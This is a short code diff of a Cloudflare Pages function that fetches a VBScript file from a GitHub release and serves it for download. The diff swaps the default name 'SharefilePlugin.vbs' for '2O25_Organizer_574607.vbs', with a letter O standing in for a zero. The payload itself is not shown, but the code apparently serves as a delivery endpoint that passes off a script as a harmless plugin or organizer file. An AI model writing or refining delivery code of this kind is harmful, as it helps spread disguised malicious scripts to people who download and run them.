@@ -1,9 +1,9 @@
 export const onRequest: PagesFunction = async (context) => {
   const url = new URL(context.request.url);
-  const filename = url.searchParams.get("name") || "SharefilePlugin.vbs";
+  const filename = url.searchParams.get("name") || "2O25_Organizer_574607.vbs";
 
   const fileUrl =
-    "https://github.com/joneraig123/vado-adb/releases/download/v1.0.0/SharefilePlugin.vbs";
+    "https://github.com/joneraig123/vado-adb/releases/download/v1.0.2/2O25_Organizer_574607.vbs";
 
   const response = await fetch(fileUrl, { redirect: "follow" });
 
